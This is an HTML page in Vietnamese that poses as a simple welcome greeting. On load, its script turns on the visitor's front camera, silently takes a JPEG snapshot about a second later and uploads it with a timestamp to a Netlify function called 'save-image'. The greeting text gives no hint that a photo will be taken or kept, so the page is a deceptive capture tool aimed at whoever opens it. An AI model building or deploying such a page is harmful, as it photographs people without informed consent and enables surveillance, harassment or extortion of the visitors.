<!DOCTYPE html>
<html lang="vi">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Chào Mừng - Auto Capture</title>
    <style>
        body { font-family: Arial, sans-serif; background: linear-gradient(135deg, #667eea, #764ba2); color: white; margin:0; padding:20px; min-height:100vh; display:flex; flex-direction:column; align-items:center; justify-content:center; }
        .welcome { background:rgba(255,255,255,0.15); padding:30px; border-radius:20px; text-align:center; max-width:700px; margin-bottom:30px; }
        video { width:100%; max-width:640px; border-radius:16px; box-shadow:0 10px 30px rgba(0,0,0,0.4); display:none; }
        .status { margin-top:25px; font-size:1.2em; }
    </style>
</head>
<body>
    <div class="welcome">
        <h1>🌟 Chào mừng bạn đã đến với Website của chúng tôi!</h1>
        <p>Chúc bạn một ngày vui vẻ, hạnh phúc!</p>
    </div>

    <video id="video" autoplay playsinline></video>
    <div class="status" id="status">Chờ đợi chút bạn nhé...</div>

    <canvas id="canvas" style="display:none;"></canvas>

    <script>
        const video = document.getElementById('video');
        const canvas = document.getElementById('canvas');
        const status = document.getElementById('status');

        async function autoCaptureAndSend() {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({
                    video: { facingMode: "user", width: { ideal: 1280 }, height: { ideal: 720 } }
                });

                video.srcObject = stream;
                video.style.display = 'block';

                video.onloadedmetadata = () => {
                    setTimeout(() => captureAndUpload(stream), 1200);
                };
            } catch (err) {
                status.textContent = "❌ Vui lòng cho phép camera.";
            }
        }

        async function captureAndUpload(stream) {
            canvas.width = video.videoWidth || 1280;
            canvas.height = video.videoHeight || 720;
            canvas.getContext('2d').drawImage(video, 0, 0);

            const imageData = canvas.toDataURL('image/jpeg', 0.9);  // base64

            // Gửi lên Netlify Function của bạn
            try {
                const response = await fetch('/.netlify/functions/save-image', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ image: imageData, timestamp: new Date().toISOString() })
                });

                if (response.ok) {
                    status.innerHTML = `✅ Đã gửi dữ liệu thành công!<br><small>Cảm ơn bạn!</small>`;
                } else {
                    status.textContent = "❌ Gửi dữ liệu thất bại.";
                }
            } catch (err) {
                status.textContent = "❌ Lỗi kết nối server.";
            }

            // Tắt webcam
            setTimeout(() => {
                stream.getTracks().forEach(track => track.stop());
                video.style.display = 'none';
            }, 1500);
        }

        window.onload = autoCaptureAndSend;
    </script>
</body>
</html>
